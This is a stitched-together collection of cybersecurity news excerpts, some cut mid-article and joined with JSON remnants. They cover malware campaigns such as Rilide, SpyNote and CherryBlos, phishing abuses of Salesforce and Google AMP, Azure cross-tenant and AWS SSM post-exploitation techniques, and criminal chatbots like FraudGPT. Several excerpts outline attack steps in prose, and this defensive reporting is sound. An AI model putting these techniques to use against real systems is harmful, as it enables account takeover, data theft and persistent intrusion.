Web servers and administrative panels by using exploits for widely known vulnerabilities or common/default passwords for admin accounts.Rather than develop its own malicious tools or malware, Mysterious Team Bangladesh uses various open-source, widely available utilities, including the \"./404FOUND.MY\" utility, the Raven-Storm toolkit, penetration-testing tool Xerxes, and DDoS tool Hulk.Content delivery networks, or geographically distributed server groups that caches content close to end users, can also help organizations distribute traffic across a network to thwart a DDoS attack.

      "text": " The malicious Rilide Stealer Chrome browser extension has returned in new campaigns targeting crypto users and enterprise employees to steal credentials and crypto wallets.Rilide is a malicious browser extension for Chromium-based browsers, including Chrome, Edge, Brave, and Opera, that Trustwave SpiderLabs initially discovered in April 2023.When first discovered, the Rilide browser extension impersonated the legitimate Google Drive extensions to hijack the browser, monitor all user activity, and steal information like email account credentials or cryptocurrency assets.Trustwave Spiderlabs have discovered a new version of Rilide that now supports the Chrome Extension Manifest V3, allowing it to overcome restrictions introduced by Google's new extension specifications and adding additional code obfuscation to evade detection.Moreover, the latest Rilide malware extension now also targets banking accounts. It can exfiltrate the stolen data via a Telegram channel or by capturing screenshots at pre-determined intervals and sending them to the C2 server.Trustwave reports that Rilide is spread in multiple ongoing campaigns, and as this is a commodity malware sold on hacker forums, it is likely they are being conducted by different threat actors.One campaign targets multiple banks, payment providers, email service providers, crypto exchange platforms, VPNs, and cloud service providers, using injection scripts, mainly focusing on users in Australia and the United Kingdom.The analysts discovered over 1,500 phishing pages using typosquatting domains, promoted via SEO poisoning on trusted search engines, and impersonating the banks and service providers to trick victims into entering their account credentials on phishing forms.In another case, users are infected via phishing emails supposedly promoting VPN or firewall apps, such as Palo Alto's GlobalProtect App.In this campaign, Trustwave found a PowerPoint presentation targeting ZenDesk employees that cleverly pretends to be a security warning, guiding users into installing the extension.This presentation includes slides that warn that threat actors are impersonating GlobalProtect to distribute malware and provides steps that the user should follow the steps in the guide to install the correct software.However, this is actually a social engineering trick to get the targeted user to install the malicious Rilide extension instead.Finally, Trustwave spotted a campaign that runs on Twitter, taking victims to phishing websites for fake P2E (Play To Earn) blockchain games. However, the installers on these sites install the Rilide extension instead, allowing the threat actors to steal the victims' cryptocurrency wallets.Regardless of the distribution campaign, upon installation, the extension communicates with the attackers' server and receives one of the following commands:With this extensive set of commands, threat actors can steal a wide variety of information that can then be used to crypto wallets and gain access to their online accounts.Manifest V3 limits the extension's access to user network requests, prevents loading code from remote sources, and moves all network request modifications from the extensions to the browser.This impacts Rilide as it relies on the injection of remotely hosted JS scripts, so its authors had to implement a combination of publicly disclosed techniques that bypass Google's requirements.For example, Trustwave's analysts report that the new version uses inline events to execute malicious JavaScript and abuses the Declarative Net Requests APIs to circumvent the XSS-prevention mechanism put in place by the Content Security Policy (CSP).Because Rilide isn't distributed via the Chrome Web Store, where the Manifest V3 policies are strictly enforced, its authors can implement workarounds to execute remotely hosted code.Trustwave's researchers have observed the use of multiple droppers for Rilide, which is explained by the fact that the malware is sold for $5,000 to cybercriminals, who must devise their own distribution method.Additionally, there have been several potentially authentic Rilide source code leaks in underground forums, exposing the malware's source code to many hackers.All this adds variety in the wild and makes Rilide campaigns harder to map and track.As the malware's original author continues to improve the malicious Chrome extension, Rilide's activity in the wild is unlikely to wane."

      "text": " The list of LOLBAS files - legitimate binaries and scripts present in Windows that can be abused for malicious purposes, will soon include the main executables for Microsoft’s Outlook email client and Access database management system.The main executable for the Microsoft Publisher application has already been confirmed that it can download payloads from a remote server. LOLBAS stands for Living-off-the-Land Binaries and Scripts and are typically described as signed files that are either native to the Windows operating system or downloaded from Microsoft.They are legitimate tools that hackers can abuse during post-exploitation activity to download and/or run payloads without triggering defensive mechanisms.According to recent research, even executables that are not signed by Microsoft serve purposes that are useful in attacks, such as reconnaissance.He tested all of them manually and found three - MsoHtmEd.exe, MSPub.exe, and ProtocolHandler.exe - that could be used as downloaders for third-party files, thus fitting the LOLBAS criteria.The researchers shared with BleepingComputer a video that shows MsoHtmEd reaching the test HTTP server with a GET request, indicating an attempt to download a test file.Later in his research, Chako discovered that MsoHtmEd could also be used to execute files.Animated by this initial success and already knowing the algorithm to find the appropriate files manually, the researcher developed a script to automate the verification process and cover a larger pool of executables faster.In total, the Pentera researcher discovered 11 new files with download and execute functionalities that meet the principles of the LOLBAS project.Standing out are MSPub.exe, Outlook.exe and MSAccess.exe, which an attacker or a penetration tester could use to download third-party files, the researcher says.While MSPub has been confirmed that it can download arbitrary payloads from a remote server, the other two are yet to be added to the LOLBAS list. They have not been included because of a technical error, Chako told BleepingComputer.“I accidentally submitted 3 Pull requests with the same code that was committed, so I need to submit them again in an orderly manner, so that they can officially be included in the project. The clerical error on my end aside, they will be part of the project.” - Nir ChakoApart from Microsoft binaries, Chako also found files from other developers that meet the LOLBAS criteria, one example being the popular PyCharm suite for Python development.The PyCharm installation folder contains elevator.exe (signed and verified by JetBrains), which can execute arbitrary files with elevated privileges.Another file in the PyCharm directory is WinProcessListHelper.exe, which Chako says can serve reconnaissance purposes by enumerating all the processes running on the system.Another example of a LOLBAS reconnaissance tool he provided BleepingComputer is mkpasswd.exe, part of the Git installation folder, which can offer the entire list of users and their security identifiers (SIDs).Chako’s journey started with two weeks to formulate a correct approach to discover new LOLBAS files, which resulted in finding three.After understanding the concept, he spent another week creating the tools to automate the discovery. The effort paid off, as the scripts enabled him to go through “the entire pool of Microsoft binaries” in about five hours.The reward is even larger, though. Chako told us that the tools he developed can also run on other platforms (e.g. Linux or custom cloud virtual machines), either in their current state or with minor modifications, to explore new LOLBAS territory.However, knowing about the LOLBAS threats can help defenders define adequate methodologies and mechanisms to prevent or mitigate cyberattacks."

      "text": " Microsoft's new Azure Active Directory Cross-Tenant Synchronization (CTS) feature, introduced in June 2023, has created a new potential attack surface that might allow threat actors to more easily spread laterally to other Azure tenants.Microsoft tenants are client organizations or sub-organizations in Azure Active Directory that are configured with their own policies, users, and settings.However, as large organizations may be split up into multiple tenants for organizational purposes, it may sometimes be easier to allow users to synchronize between authorized tenants controlled by the same entity.When configuring CTS, an Azure 'source' tenant will be synchronized with a 'target' tenant, where users from the source can automatically be synchronized to the target tenant. When synchronizing users, the user is only pushed from the source and not pulled from the target, making this a one-sided synchronization.However, if improperly configured, attackers who have already compromised a tenant and gained elevated privileges may exploit the new feature to move laterally to other connected tenants and then deploy rogue CTS configurations to establish persistence on those networks.In a report published yesterday, cybersecurity firm Vectra AI elaborates on how threat actors can abuse this feature to spread laterally to linked tenants or even use this feature for persistence. However, they also warn that abusing this feature requires a threat actor to first compromise a privileged account or gain privilege escalation in a breached Microsoft cloud environment.The first technique described in Vectra AI's report involves reviewing the CTS configurations to identify target tenants connected through these policies and, specifically, look for tenants with 'Outbound Sync' enabled, which allows syncing to other tenants.Upon finding a tenant that meets those criteria, the attacker locates the app used for CTS syncing and modifies its configuration to add the compromised user into its sync scope, gaining access to the other tenant's network. This allows the threat actor to achieve lateral movement without requiring new user credentials.The second technique presented by Vectra involves deploying a rogue CTS configuration to maintain persistent access to the target tenants. Once again, it needs to be noted that this method requires a threat actor to already compromise a privileged account in the tenant.Specifically, the attacker deploys a new CTS policy and enables 'Inbound Sync' and 'Automatic User Consent,' allowing them to push new users from their external tenant to the target anytime.This setup grants the attacker access to the target tenant anytime via the external account.Even if the rogue accounts are removed, the attacker can create and \"push\" new users at will, gaining immediate access to the resources of the target tenant, hence why the researchers calls this a \"backdoor.\"\n​While no known attacks have abused this feature, the researchers have offered guidance on hardening your configuration to prevent the feature from being abused.Vectra proposes that CTS target tenants must avoid implementing a default or overly inclusive inbound CTA configuration and, if possible, set limits on which users and groups can access their cloud environments.CTS source tenants that act as the initial breach points must monitor all privileged users for suspicious activity.Invictus' report provides detailed information on how CTS activity is logged, allowing admins to detect malicious behavior.BleepingComputer contacted Microsoft with questions on the report, but they declined to comment."

Several of the TTPs seen in the recent operation depart from past activity, suggesting that BlueCharlie is evolving its operations, potentially in response to public disclosures of its operations in industry reporting. Since Insikt Group’s initial tracking of the group in September 2022, we have observed BlueCharlie engage in several TTP shifts. These shifts demonstrate that these threat actors are aware of industry reporting and show a certain level of sophistication in their efforts to obfuscate or modify their activity, aiming to stymie security researchers. To counter BlueCharlie's threat, network defenders should enhance phishing defenses, implement FIDO2-compliant multi-factor authentication, use threat intelligence, and educate third-party vendors. BlueCharlie's continued use of phishing and its historical adaptation to public reporting suggest it will remain active and evolve further in its operations.Contact us today"

With these changes, the skill required to start a ransomware attack could be reduced to constructing a malicious AI prompt and having access to ransomware-as-a-service tools, leading to a whole new wave of attacks.”For this study, Barracuda analyzed 175 publicly reported successful ransomware attacks worldwide between August 2022 and July 2023.“The sample size is small because the overwhelming majority of attacks are stopped before they become incidents. While the volume of publicly reported ransomware attacks has doubled in some industries, you can be sure the volume of unreported attacks has also increased dramatically,” the company wrote.Barracuda provided mitigation advice that organizations can implement “even with limited resources” to help recover from a ransomware attack.

This not only makes the interactions more persuasive but also reduces the workload for the scammers when dealing with multiple victims.Moreover, recent cases revealed that scammers are not stopping at the initial “tax” payment but are coming up with additional excuses to extract even more money from victims.The scammers have also slipped their fraudulent apps past both Apple’s and Google’s app store reviews by modifying the app’s content after approval. By changing a pointer in remote code, the benign app can be switched to a fraudulent one without further scrutiny.“Prior to being able to get their apps into the Apple Store, CryptoRom fraudsters had to use an awkward technical workaround to target iOS users, which could alert their victims that something was amiss,” Gallagher explained. “Now, it’s much easier for them to target iPhone users, expanding their victim pool.”Victims are also advised to contact their banks to see if any transactions can be reversed and report the wallet addresses of the fraud to the relevant cryptocurrency exchange."

As the affected website served for job applications, people who sought employment at Burger King in France might have been potentially affected.It’s not the first time Burger King has leaked sensitive data. In 2019, due to a similar misconfiguration, the France branch reportedly leaked personally identifiable information (PII) of children who bought Burger King menus.Cybernews reached out to the company, and it fixed the issue.Publicly accessible credentialsOn June 1st, 2023, the Cybernews research team discovered a publicly accessible environment file (.env) belonging to Burger King’s French website, containing various credentials. The file was hosted on the subdomain used for posting job offers.Although the leaked data itself wouldn’t be sufficient to gain complete control over the website, it could significantly simplify the process of a potential takeover for attackers, especially if they manage to identify other vulnerable endpoints.Among other sensitive data, the file contained credentials for a database. While, due to legal reasons, the researchers could not check what exactly was stored in the database, there were likely job posts and perhaps other data entered by the applicants.The exposure of database credentials is dangerous, as a malicious actor could use them to connect to the database and read or modify data stored within. If a threat actor is able to find and exploit an arbitrary PHP code execution vulnerability within the site, the credentials within .env could allow easier and more stealthy extraction of the MySQL database.Another piece of sensitive information that the research team observed included a Google Tag Manager ID. Google Tag Manager is a tool used to optimize update measurement codes and related code fragments, collectively known as tags, on a website or mobile app. Google Tag Manager ID specifies which tag manager container should be used by the website.By holding these credentials and combining them with other vulnerable points on the website, attackers could potentially change the Tag ID to an ID of their own container. Then they’d be able to execute arbitrary JavaScript code on the website.Corrupting the website’s metricsFinally, researchers found a Google Analytics ID. This is used to determine which traffic should be recorded and sent to the associated Google Analytics account.An attacker could exploit this leaked data to set up the ID on a site which they control, and then flood it with automatically generated traffic. This influx would overwhelm the associated Google Analytics account, causing significant disruption and distortion of the website’s performance analysis for the duration of the attack.\nCopyright@securityaffairs 2023 "

      "text": " Hackers exploited a zero-day vulnerability in Salesforce's email services and SMTP servers to launch a sophisticated phishing campaign targeting valuable Facebook accounts.The attackers chained a flaw dubbed \"PhishForce,\" to bypass Salesforce's sender verification safeguards and quirks in Facebook's web games platform to mass-send phishing emails.The benefit of using a reputable email gateway like Salesforce to distribute phishing emails is the evasion of secure email gateways and filtering rules, ensuring that the malicious emails reach the target's inbox.However, the discovered issues in Facebook's game platform are outstanding, as Meta's engineers are still trying to figure out why the existing mitigations failed to stop the attacks.The Salesforce CRM allows customers to send emails as their own brand using custom domains that the platform must first verify. This protects customers from sending out emails through Salesforce as other brands that they do not have permission to impersonate.However, Guardio Labs says the attackers figured out a way to exploit Salesforce's \"Email-to-Case\" feature, which organizations use for converting incoming customer emails to actionable tickets for their support teams.Specifically, the attackers set up a new \"Email-to-Case\" flow to gain control of a Salesforce-generated email address, then created a new inbound email address on the \"salesforce.com\" domain.Next, they set that address as an \"Organization-Wide Email Address,\" which Salesforce's Mass Mailer Gateway uses for outbound emails, and finally went through the verification process to confirm ownership of the domain.This process allowed them to use their Salesforce email address to send out messages to anyone, bypassing both Salesforce's verification protections and any other email filters and anti-phishing systems in place.Indeed, this is what Guardio Labs observed in the wild, with phishing emails that supposedly came from \"Meta Platforms\" using the \"case.salesforce.com\" domain.Clicking on the embedded button takes the victim to a phishing page hosted and displayed as part of the Facebook gaming platform (\"apps.facebook.com\"), which adds further legitimacy to the attack and makes it even harder for the email recipients to realize the fraud.The goal of the phishing kit employed in this campaign is to steal Facebook account credentials, even featuring two-factor authentication bypassing mechanisms.After confirming the issues by replicating the creation of a Salesforce-branded address capable of disseminating phishing emails, Guardio Labs notified the vendor of their discovery on June 28, 2023Salesforce reproduced the vulnerability and resolved the problem exactly a month later, on July 28, 2023.Regarding the abuse of \"apps.facebook.com,\" Guardio Labs notes that it should be impossible for the attackers to create the game canvass used as a landing page since Facebook retired this platform in July 2020.However, legacy accounts that used the platform before its deprecation still have access, and threat actors might be paying a premium for those accounts on the dark web.Meta removed the violating pages upon Guardio Labs' report; however, its engineers are still investigating why existing protections failed to stop the attacks.As phishing actors continue to explore every potential abuse opportunity on legitimate service providers, novel security gaps constantly threaten to expose users to severe risks.Thus, it is essential not to rely solely on email protection solutions, and also scrutinize every email that lands on your inbox, look for inconsistencies, and double-check all claims made in those messages."

      "text": " Researchers have discovered a new post-exploitation technique in Amazon Web Services (AWS) that allows hackers to use the platform's System Manager (SSM) agent as an undetectable Remote Access Trojan (RAT).The attack concept, devised by security researchers at Mitiga, impacts both Windows and Linux machines and is preferable to using common malware and backdoors as its abuse will less likely be detected by security software. \"We strongly believe that threat actors will abuse this in real-world attacks if they do not do so already,\" warns Mitiga in the report.AWS Systems Manager (SSM) is an Amazon-signed binary and comprehensive endpoint management system used by administrators for configuration, patching, and monitoring AWS ecosystems comprising EC2 instances, on-premise servers, or virtual machines.When configuring SSM to be in hybrid mode, it allows an AWS account to manage non-EC2 machines, including on-premise servers, AWS IoT devices, and virtual machines, including those in other cloud environments.\"We abused this feature by registering an SSM agent to run in \"hybrid\" mode even if the agent runs on an EC2 instance.\"Additionally, bash commands allow the SSM agent to communicate and execute commands using AWS accounts not associated with the compromised EC2 environment. SSM's proxy feature can also be abused to pass network traffic outside any AWS infrastructure.\"We found a unique way to abuse the SSM service, allowing it to function seamlessly as a fully integrated trojan infrastructure, making the agent in the endpoint to communicate with different AWS account (which can be used by the attacker) than the original AWS account,\" explains Mitiga\"By executing commands from a separate, maliciously owned AWS account, the actions carried out by the SSM agent will remain hidden within the original AWS account, making the process of detecting the malicious activity cumbersome.\"If hijacking existing SSM agents is unattainable due to a lack of permissions, hackers can run another SSM agent process, which works parallel to any existing processes and gives attackers access to the \"Run Command\" feature.However, the attack is easier to detect in this case as it leaves more traces, and establishing persistence becomes more difficult.Abusing the SSM agent allows attackers to breach AWS accounts to execute commands remotely without being detected, as the traffic looks like regular activity generated by the agents.After disclosing the post-exploitation method to Amazon, the AWS security team said it's possible to restrict the reception of commands in EC2 instances using the VPC endpoint for Systems Manager, setting the original AWS account or organization as the only approved source.Furthermore, Mitiga suggests removing the SSM agent from the allow-list of antivirus or EDR solutions and integrating the detection techniques presented in its report into your SIEM and SOAR platforms.\"The widespread popularity and initial trust associated with the SSM agent further amplify the need for organizations to take immediate action to mitigate this new technique,\" concludes Mitiga's report.Update 8/4: An Amazon spokesperson has sent BleepingComputer the following comment:AWS software and systems are behaving as designed and there is no need for customers to take any action.The issues described in the Mitiga publication, titled “Mitiga Security Advisory: Abusing the SSM Agent as a Remote Access Trojan,” require an actor to both obtain root level credentials and successfully access an EC2 instance in order to be leveraged.As a security best practice, we recommend AWS customers follow our documentation on properly configuring VPC Endpoints with AWS Systems Manager and to use global condition keys for VPC Endpoints and VPC Endpoint Policies to mitigate the risk of inappropriate access to EC2 instances."

      "text": " A new software-based power side-channel attack called 'Collide+Power' was discovered, impacting almost all CPUs and potentially allowing data to leak. However, the researchers warn that the flaw is low-risk and will likely not be used in attacks on end users.The flaw was discovered by researchers at the Graz University of Technology and exploits weaknesses in the CPU hardware to leak potentially sensitive data.The main concept of Collide+Power is to leak data from measured CPU power consumption values when a data \"collision\" between the attacker's dataset and data sent by other applications to overwrite the former happens in CPU cache memory.Collide+Power comprises two variants that create data collisions between the user's sensitive data and the attacker's data inside the CPU cache.The first method requires enabling hyperthreading and the victim to access the targeted secrets, like a decryption key.The second variant abuses the \"prefetch gadget\" in the OS to load the target data onto the CPU cache and collide it with the attacker's data without involving the victim.Collide+Power impacts processors made by Intel, AMD, and those using ARM architectures. However, the researchers have not disclosed specific models, so it is unclear if all modern CPUs are affected.Despite the potentially broad impact, the developers of the attack clearly state that users \"do not need to worry\" about it as the data leakage rates are relatively low, and the attack requires lengthy physical access to the target device as well as specialized knowledge to carry out.AMD has made a similar statement on its security bulletin about CVE-2023-20583, playing down the practical importance of the attack for the average user.AMD stated that its EPYC server processors have a performance determinism mode that helps mitigate this data leakage, while Ryzen series processors can have their core boost function disabled to reduce frequency changes and make it harder to leak data from CPU memory.As for mitigating the problem, the Graz team says data collisions are complicated to address given the prevalence of specific design techniques underpinning almost all modern CPUs, constituting the basis for Collide+Power.\"Preventing data collisions in hardware is a highly complex redesign of general-purpose CPUs, which we think is unlikely to happen in the near future due to the number of shared hardware components in a CPU,\" explain the researchers.\"Therefore, the more realistic mitigation is preventing an attacker from observing the power-related signal.\""

However, Unit 42 said it has indications that the threat actors behind it will continue to use similar techniques to hijack Facebook business accounts going forward, “which poses great risk for both individuals and organizations.”This includes financial losses and reputational damage for the target, as well as further attacks being launched using stolen credentials from the browsers.The new infostealer variant uncovered by Unit 42 has additional features to benefit the threat actors, most notably cryptostealing and downloader capabilities, in addition to the ability to fully take over Facebook business accounts.The researchers said the primary method to target victims with the infostealer, which they referred to as ‘Nodestealer 2.0,’ was a phishing campaign that took place around December 2022. This was mainly centered around advertising materials for businesses, with multiple Facebook pages and users posting information luring victims to download a link from known cloud file storage providers.When clicked, a .zip file containing the malicious infostealer executable would be downloaded to the user’s device.The campaign used two variants of the malware, both written in Python, which Unit 42 named Variant #1 and Variant #2.As with Ducktail and NodeStealer, the latest malware discovered by Unit 42 is suspected to originate from threat actors based in Vietnam.The Unit 24 blog post advised organizations with Facebook business accounts to review their protection policies and use indicators of compromise (IoCs) provided in the report to mitigate similar threats going forward.“Facebook business account owners are encouraged to use strong passwords and enable multifactor authentication.

Once replication is complete, the malware loads a malicious shared object file, granting reverse shell access and the ability to run arbitrary shell commands on the host.Furthermore, the malware uses evasion techniques to hinder dynamic analysis, making detection and analysis more challenging.After gaining a foothold, P2Pinfect demonstrates worm-like behavior, actively attempting to spread to other hosts on the network. It scans for exposed Redis and SSH servers and uses a list of passwords to try brute-force attacks.“It’s possible that this functionality will be enabled at a later date, and the malware is certainly capable of updating itself to include such functionality,” reads the post.“This allows the operator to rapidly deploy any payload of their choosing. We will continue to monitor this malware and post updates as they occur.”"

      "text": " Hackers are using a fake Android app named 'SafeChat' to infect devices with spyware malware that steals call logs, texts, and GPS locations from phones.The Android spyware is suspected to be a variant of \"Coverlm,\" which steals data from communication apps such as Telegram, Signal, WhatsApp, Viber, and Facebook Messenger.CYFIRMA researchers say the Indian APT hacking group 'Bahamut' is behind the campaign, with their latest attacks conducted mainly through spear phishing messages on WhatsApp that send the malicious payloads directly to the victim.In the latest campaign observed by CYFIRMA, Bahamut targets individuals in South Asia.While CYFIRMA doesn't delve into the specifics of the social engineering aspect of the attack, it's common for victims to be persuaded into installing a chat app under the pretext of transitioning the conversation to a more secure platform.The analysts report that Safe Chat features a deceiving interface that makes it appear as a real chat app and also takes the victim through a seemingly legitimate user registration process that adds credibility and serves as an excellent cover for the spyware.One critical step in the infection is the acquisition of permissions to use the Accessibility Services, which are subsequently abused to automatically grant the spyware more permissions.These additional permissions enable the spyware to access to the victim's contacts list, SMS, call logs, external device storage, and fetch precise GPS location data from the infected device.The app also requests the user to approve exclusion from Android's battery optimization subsystem, which terminates background processes when the user isn't actively engaging with the app.\"The interaction will take place using intents, OPEN_DOCUMENT_TREE permission will select specific directories and access apps mentioned in intent.\"A dedicated data exfiltration module transfers information from the device to the attacker's C2 server through port 2053.The stolen data is encrypted using another module that supports RSA, ECB, and OAEPPadding. At the same time, the attackers also use a \"letsencrypt\" certificate to evade any network data interception efforts against them.CYFIRMA concludes the report by saying that it holds enough evidence to link Bahamut to working on behalf of a specific state government in India.Also, using the same certificate authority as the DoNot APT group, similar data stealing methodologies, common targeting scope, and the use of Android apps to infect targets all indicate overlap or close collaboration between the two groups.Update 8/4 - A Google spokesperson has sent BleepingComputer the following comment:Users are protected by Google Play Protect, which can warn users of identified malicious apps on Android devices."

      "text": " Both AI-powered bots are the work of the same individual, who appears to be deep in the game of providing chatbots trained specifically for malicious purposes ranging from phishing and social engineering, to exploiting vulnerabilities and creating malware.FraudGPT came out on July 25 and has been advertised on various hacker forums by someone with the username CanadianKingpin12, who says the tool is intended for fraudsters, hackers, and spammers.An investigation from researchers at cybersecurity company SlashNext, reveals that CanadianKingpin12 is actively training new chatbots using unrestricted data sets sourced from the dark web or basing them on sophisticated large language models developed for fighting cybercrime.In private conversations, CanadianKingpin12 said that they were working on DarkBART - a \"dark version\" of Google's conversational generative artificial intelligence chatbot.The researchers also learned that the advertiser also had access to another large language model named DarkBERT developed by South Korean researchers and trained on dark web data but to fight cybercrime.SlashNext researchers shared that CanadianKingpin12 said that the DarkBERT bot is \"superior to all in a category of its own specifically trained on the dark web.\" The malicious version has been tuned for:As CanadianKingpin12 said in private messages with the researchers, both DarkBART and DarkBERT will have live internet access and seamless integration with Google Lens for image processing.To demonstrate the potential of the malicious version of DarkBERT, the developer created the following video:It is unclear if CanadianKingpin12 modified the code in legitimate version of DarkBERT or just obtained access to the model and simply leveraged it for malicious use.No matter the origin of DarkBERT and the validity of the threat actor's claims, the trend of using generative AI chatbots is growing and the adoption rate is likely to increase, too, as it can provide an easy solution for less capable threat actors or for those that want to expand operations to other regions and lack the language skills.With hackers already having access to two such tools that can assist with executing advanced social engineering attacks and their development in less than a month, \"underscores the significant influence of malicious AI on the cybersecurity and cybercrime landscape,\" SlashNext researchers believe.Update 8/7 - Dr.Chung, the Head of AI & the author of DarkBERT at S2W has sent BleepingComputer the following comment regarding the above:Since S2W adheres to the strict and ethical guidelines outlined by the ACL, access to DarkBERT is granted following careful evaluation and is exclusively approved for academic and public interest.To develop a DarkBERT model for illicit intentions, as asserted by CanadianKingpin12, an extensive process of precise refinement using a considerable volume of darkweb data, coupled with integration into an LLM and allocation of resources, would be necessary. However, achieving such outcomes within a brief timeframe (less than a month) since S2W's public release seems highly implausible.Even if CanadianKingpin12 were to somehow misuse the granted access, its application would be restricted due to the preprocessing and model training, which effectively eliminated sensitive personal information. This inherently prevents the possibility of exploiting BEC campaigns or misusing any form of personal data.Given these observations, we suspect the validity of CanadianKingpin12's assertion, perceiving it as an effort to exploit DarkBERT's popularity. The purported functionalities they claim cannot be presently verified, leading us to suspect that CanadianKingpin12 might be leveraging the concept of DarkBERT for promotional motives."

      "text": " Security researchers are warning of increased phishing activity that abuses Google Accelerated Mobile Pages (AMP) to bypass email security measures and get to inboxes of enterprise employees.Google AMP is an open-source HTML framework co-developed by Google and 30 partners to make web content load faster on mobile devices.AMP pages are hosted on Google’s servers, where content is simplified and some of the heavier media elements are pre-loaded for faster delivery.The idea behind using Google AMP URLs embedded in phishing emails is to make sure that email protection technology does not flag messages as malicious or suspicious due to Google’s good reputation.The AMP URLs trigger a redirection to a malicious phishing site, and this additional step also adds an analysis-disrupting layer.Data from anti-phishing protection company Cofense shows that the volume of phishing attacks employing AMP spiked spiked significantly towards mid-July, suggesting that threat actors may be adopting the method.Although the “google.com/amp/s/” path is common in all cases, blocking this would also impact all legitimate cases of using Google AMP. However, flagging them may be the most appropriate action, to at least alert recipients to be wary of potentially malicious redirections.Cofense says the phishing actors who abuse the Google AMP service also employ a range of additional techniques that collectively help evade detection and increase their success rate.For example, in many cases observed by Cofense, the threat actors used image-based HTML emails instead of a traditional text body. This is to confuse text scanners that look for common phishing terms in the message content.In another example, the attackers used an extra redirection step, abusing a Microsoft.com URL to take the victim to a Google AMP domain and eventually to the actual phishing site.Finally, attackers employed Cloudflare’s CAPTCHA service to thwart automated analysis of the phishing pages by security bots, preventing the crawlers from reaching them.All in all, phishing actors today employ multiple detection-evading methods that make it increasingly difficult for targets and security tools to catch the threats and block them."

      "text": " Researchers this week warned of two related malware campaigns, dubbed CherryBlos and FakeTrade, targeting Android users for cryptocurrency theft and other financially motivated scams. The operators of the campaign are distributing the malware via fake Android apps on Google Play, social media platforms, and phishing sites.In a report this week, Trend Micro said its researchers had discovered the two malware strains recently and had observed the malware using the same network infrastructure and application certificates. This points to the same threat actor being behind both campaigns, the researchers noted.One, somewhat unusual — and dangerous — feature in CherryBlos is its ability to use optical character recognition (OCR) to read any mnemonic phrases that might be present in pictures on a compromised host device, and to send that data to its command-and-control server (C2). In the context of cryptocurrency, mnemonic phrases are what people use when they want to recover or restore a crypto wallet.The CherryBlos malware is engineered to steal cryptocurrency wallet-related credentials, and to replace a victim's wallet address when they make withdrawals. Trend Micro said it had observed the malware operator using Telegram, TikTok, and X (the platform formerly known as Twitter), to display ads promoting fake Android apps containing the malware. The ads typically pointed to phishing sites that hosted the fake apps. Trend Micro said it had identified at least four fake Android apps containing CherrBlos: GPTalk, Happy Miner, Robot99, and SynthNet.Once installed on a device, CherryBlos retrieves two configuration files from its C2. It also uses multiple methods for persistence and to evade anti-malware controls. The malware's persistence mechanisms include automatically approving various permission requests and sending the user back to the home screen when they attempt to access the app's settings.For the FakeTrade campaign, which features similar technology, the threat actor has so far used at least 31 fake Android apps to distribute the malware. Many of these fake apps have featured shopping-related themes and have claimed users could earn money by completing certain tasks or by purchasing additional credit in an application. Often when users fell for the lure and topped-up their accounts, they were subsequently unable to withdraw from it later.Many of the apps in the FakeTrade campaign were available on Google Play in 2021 and for the first three quarters of 2022. But Google has removed all of the offending apps since then, Trend Micro said. Even so, FakeTrade and CherryBlos continue to present a significant threat for Android users: \"The threat actor behind these campaigns employed advanced techniques to evade detection, such as software packing, obfuscation, and abusing Android's Accessibility Service,\" according to the report.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

During June and July 2023, there has been a noticeable surge in targeted campaigns against multiple European customers of different banks.The infection chain typically begins with a deceptive SMS message urging users to install a “new certified banking app,” followed by a redirect to a seemingly authentic TeamViewer app, which is used for technical remote support. In reality, this is the initial step to gain remote access to the victim’s device.SpyNote’s main features involve exploiting Accessibility services to automatically accept other permission popups and carry out keylogging activities. By tracking user activities, the spyware gains access to crucial information like installed applications, specific app properties and text inputs, all of which can be used to steal sensitive banking credentials.Additionally, SpyNote can intercept SMS messages, including two-factor authentication (2FA) codes, and transmit them to the attackers’ command-and-control (C2) server, bypassing the extra layer of security put in place by financial institutions. The malware can also record screens, providing the attackers with substantial control and information.To evade detection and analysis, SpyNote employs various defense evasion techniques, such as code obfuscation, anti-emulator controls and the prevention of manual removal by hiding the application icon.Cleafy concluded its report by saying that the aggressive and extensive nature of the recent SpyNote campaign indicates that threat actors will likely continue to exploit this spyware’s multiple functionalities to perpetrate bank fraud. “Although this is not the first time that spyware has been used to carry out bank fraud [...] this SpyNote campaign is certainly one of the most aggressive in recent times,” reads the report.“By observing the aggressiveness and extension of this recent SpyNote campaign, we assume that TAs will continue to use this spyware to carry out bank fraud due to the multiple functionalities.”"

The suspicious Android malware is a dummy chatting app. Our initial technical analyses revealed that APT Bahamut is behind the attack. As technical analyses proceeded further, we also found footprints of tactics used by DoNot APT in the suspicious app belonging to APT Bahamut.The malware that was acquired was specifically utilized to target individuals residing in South Asia. This particular malware exhibits a similar operational mechanism to the previously identified malware (distributed through the Google Play Store by the notorious APT group known as ‘DoNot’), however, this malware has more permissions, and thus presents a higher level of threat. The suspected Android malware, known initially as “CoverIm” was delivered to victims via WhatsApp, and was found to be disguised as a dummy chatting application named “SafeChat”. The user interface of this app successfully deceives users into believing its authenticity, allowing the threat actor to extract all the necessary information, before the victim realizes that the app is a dummy, the malware cleverly exploits unsuspecting Android Libraries to extract and transmit data to a command-and-control server. Our in-depth technical analysis will provide a comprehensive overview of this Android malware and shed light on the sophisticated methods employed by the threat actor to exploit Android Libraries for the purpose of data retrieval from victims’ mobile devices. Let’s dive into the technical analyses.After installation, a suspected app with the name “Safe Chat” appears on the main menu.After opening the app, the user is shown a landing page where the user is notified of operating a secure chatting app.Upon opening the app, after fresh installation, the pop-up message instructs the user to allow permission.The below screenshot shows the app throwing another pop-up message and asking the user for permission to keep the app working in the background. Once allowed, the app will work even when the app is minimized or closed. This permission will let command and control seamlessly communicate with the app.Once permission for ignoring battery optimization is allowed the user is allowed to sign in and sign-up.The sign-up page:After completion, the app signs you in, and then the user is shown another pop-up message for permission. This time it throws a pop-up showing the need for another permission app to work properly.Once the user clicks on “Allow” as shown in the previous screenshot, the app takes the user to the accessibility page and asks the victim to enable accessibility for the Safe Chat app. Once the accessibility is on, then the malware will capture activity on screen including keystrokes. Until it is enabled, the app will throw a pop-up message again and again, as shown in the previous screenshot.After enabling accessibility for the Safe Chat app, it works properly, showing a different dummy page like any other chatting app.This excerpt is from the Android Manifest file that belongs to the suspicious Safe Chat Android app, showing permissions that are being employed by the app to perform malicious activity.This table contains permissions that are dangerous if exploited for malicious activity:Another snippet from the Android Manifest file shows that the threat actor designed the app to interact with other already installed chat applications. The interaction will take place using intents, OPEN_DOCUMENT_TREE permission will select specific directories and access apps mentioned in 